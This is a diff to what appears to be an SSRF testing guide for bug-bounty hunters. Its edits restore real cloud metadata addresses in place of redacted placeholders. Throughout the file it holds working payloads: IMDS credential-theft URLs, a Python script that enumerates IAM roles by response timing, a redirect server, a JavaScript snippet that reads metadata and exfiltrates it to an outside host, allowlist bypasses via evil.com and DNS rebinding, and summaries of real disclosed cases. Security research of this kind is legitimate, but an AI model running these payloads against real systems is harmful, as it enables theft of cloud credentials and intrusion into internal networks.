@@ -16,7 +16,7 @@ Use when the target has any feature that fetches a URL, imports data from a remo
 
 SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:
 
-- **Cloud-hosted SaaS products** (GCP metadata at `[REDACTED_IP]` or `metadata.google.internal`, AWS IMDSv1)
+- **Cloud-hosted SaaS products** (GCP metadata at `169.254.169.254` or `metadata.google.internal`, AWS IMDSv1)
 - **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
 - **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
 - **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
@@ -132,8 +132,8 @@ X-Cache headers revealing internal hostnames
 
 4. **Test internal cloud metadata endpoints**:
    - GCP: `http://metadata.google.internal/computeMetadata/v1/`
-   - AWS: `http://[REDACTED_IP]/latest/meta-data/`
-   - Azure: `http://[REDACTED_IP]/metadata/instance`
+   - AWS: `http://169.254.169.254/latest/meta-data/`
+   - Azure: `http://169.254.169.254/metadata/instance`
 
 5. **Test localhost and common internal ports**:
    ```
@@ -165,10 +165,10 @@ X-Cache headers revealing internal hostnames
        return time.perf_counter() - start
 
    # IMDS response size correlates with timing
-   baseline = ssrf_time("http://[REDACTED_IP]/latest/meta-data/")
+   baseline = ssrf_time("http://169.254.169.254/latest/meta-data/")
    # Role exists = JSON payload (slower), 404 = tiny response (faster)
    for role in ["admin","ec2","s3","lambda","ecs","SSM-Role","EC2Role"]:
-       t = ssrf_time(f"http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/{role}")
+       t = ssrf_time(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
        print(f"  {role}: {t:.3f}s -> {'FOUND' if t > baseline*1.15 else '404'}")
    ```
 
@@ -214,14 +214,14 @@ curl --max-time 30 --connect-timeout 10 -s "https://target.com/api/fetch" \
 ```bash
 # GCP - requires Metadata-Flavor header (test if server adds it automatically)
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-http://[REDACTED_IP]/computeMetadata/v1/project/project-id
+http://169.254.169.254/computeMetadata/v1/project/project-id
 
 # AWS IMDSv1 (no auth required)
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
-http://[REDACTED_IP]/latest/user-data
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
 
 # Azure
-http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
 ```
 
 ### Localhost/Internal Port Payloads
@@ -247,10 +247,10 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 class Redirect(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(301)
-        self.send_header('Location', 'http://[REDACTED_IP]/latest/meta-data/')
+        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
         self.end_headers()
 
-HTTPServer(('192.0.2.1', 8080), Redirect).serve_forever()
+HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
 ```
 
 ### JavaScript-Based SSRF (headless browser contexts)
@@ -264,7 +264,7 @@ fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accou
 
 // DNS exfil for blind contexts
 var x = new XMLHttpRequest();
-x.open('GET','http://[REDACTED_IP]/latest/meta-data/');
+x.open('GET','http://169.254.169.254/latest/meta-data/');
 x.send();
 x.onload = function(){
   var img = new Image();
@@ -319,14 +319,14 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
 # IPv6 equivalents
 http://[::1]/
 http://[::ffff:127.0.0.1]/
-http://[::ffff:[REDACTED_IP]]/
+http://[::ffff:169.254.169.254]/
 
 # Decimal/octal/hex encoding of IP
 http://2130706433/          (127.0.0.1 decimal)
 http://0x7f000001/          (127.0.0.1 hex)
 http://0177.0.0.1/          (octal)
 http://127.1/               (short form)
-http://0/                   (resolves to 192.0.2.1)
+http://0/                   (resolves to 0.0.0.0)
 
 # DNS rebinding - register a domain that resolves to internal IP after first check
 # Use https://lock.cmpxchg8b.com/rebinder.html
@@ -350,7 +350,7 @@ sftp://attacker.com:11111/
 ldap://127.0.0.1/
 
 # Redirect chain bypass
-https://allowlisted-domain.com → HTTP 301 → http://[REDACTED_IP]/
+https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/
 
 # Case variation / URL encoding
 http://Localhost/
@@ -360,8 +360,8 @@ http://127.0.0.1%2F@evil.com/
 ### Schema/Protocol Bypasses
 ```
 # When only http/https allowed but implementation is loose
-http://[REDACTED_IP]:80@evil.com/
-//[REDACTED_IP]/
+http://169.254.169.254:80@evil.com/
+//169.254.169.254/
 ```
 
 ### TOCTOU (Time-of-Check vs Time-of-Use)
@@ -415,7 +415,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 3. **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** ([H1 #2262382](https://hackerone.com/reports/2262382) · [Writeup](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e))
     - Subclass: headless-browser SSRF (PDF generator) → AWS metadata SSRF (IMDSv1)
-    - Payload: injected `<iframe src="http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/">` into a template element rendered server-side; backend Ruby loop rendered the untrusted template HTML into PDF, reflecting IMDS response inside the rendered PDF / error message
+    - Payload: injected `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` into a template element rendered server-side; backend Ruby loop rendered the untrusted template HTML into PDF, reflecting IMDS response inside the rendered PDF / error message
     - Root cause: unsanitised user-controlled template fragment reflected in PDF rendering pipeline; no IMDSv2 enforcement
     - Year: 2023 — **$25,000** (CVSS 10.0 Critical)
 
@@ -427,7 +427,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 5. **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** ([H1 #1369312](https://hackerone.com/reports/1369312))
     - Subclass: DNS rebinding SSRF → AWS metadata SSRF (IMDSv1)
-    - Payload: file-upload-from-URL feature; attacker DNS server alternated `A` records between `[REDACTED_IP]` (public) and `[REDACTED_IP]`; needed 2-3 requests to win the race between validation and fetch; final request retrieved IAM role credentials
+    - Payload: file-upload-from-URL feature; attacker DNS server alternated `A` records between `169.254.169.254` (public) and `169.254.169.254`; needed 2-3 requests to win the race between validation and fetch; final request retrieved IAM role credentials
     - Root cause: validated hostname by resolving once; download path re-resolved DNS without pinning the validated IP
     - Year: 2021 — fixed in 8.5.7 / 9.0.1
 
@@ -445,7 +445,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 8. **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** ([Binary Security writeup](https://www.binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops))
     - Subclass: webhook URL field SSRF + DNS rebinding SSRF → Azure IMDS / managed identity
-    - Payload: configured service-hook webhook URL or `endpointproxy` URL parameter to attacker rebinding host; second resolution returned `[REDACTED_IP]`; chained CRLF injection to set required `Metadata: true` header for Azure IMDS
+    - Payload: configured service-hook webhook URL or `endpointproxy` URL parameter to attacker rebinding host; second resolution returned `169.254.169.254`; chained CRLF injection to set required `Metadata: true` header for Azure IMDS
     - Root cause: validation-then-fetch with separate DNS lookups; CRLF in URL path injected headers needed by Azure IMDS
     - Year: 2023-2024 — **$15,000 total** across 3 reports
 
@@ -480,7 +480,7 @@ All 3 tests verify the skill is properly structured and ready for use.
 - **Blind SSRF without confirmation** — sending a request without reading the response is blind SSRF. Demonstrate via Collaborator/OOB callback.
 - **SSRF to localhost but no open ports** — reaching 127.0.0.1 proves SSRF. Need to demonstrate access to a useful service (metadata, admin, database).
 - **URL validation bypass** — `http://127.0.0.1@evil.com` or `http://0x7f000001` bypasses naive URL parsers. Test multiple bypass techniques.
-- **Cloud metadata access** — 192.0.2.1 is the holy grail of SSRF. One IAM credential extraction = Critical.
+- **Cloud metadata access** — 169.254.169.254 is the holy grail of SSRF. One IAM credential extraction = Critical.
 
 ---
 
@@ -498,11 +498,11 @@ All 3 tests verify the skill is properly structured and ready for use.
 
 | Provider | Metadata Endpoint |
 |---|---|
-| AWS IMDSv1 | `http://[REDACTED_IP]/latest/meta-data/` |
+| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` |
 | GCP | `http://metadata.google.internal/computeMetadata/v1/` |
-| Azure | `http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01` |
-| DigitalOcean | `http://[REDACTED_IP]/metadata/v1.json` |
-| Alibaba Cloud | `http://[REDACTED_IP]/latest/meta-data/` |
+| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
+| DigitalOcean | `http://169.254.169.254/metadata/v1.json` |
+| Alibaba Cloud | `http://169.254.169.254/latest/meta-data/` |
 
 Gopher protocol to Redis/FastCGI RCE:
 ```
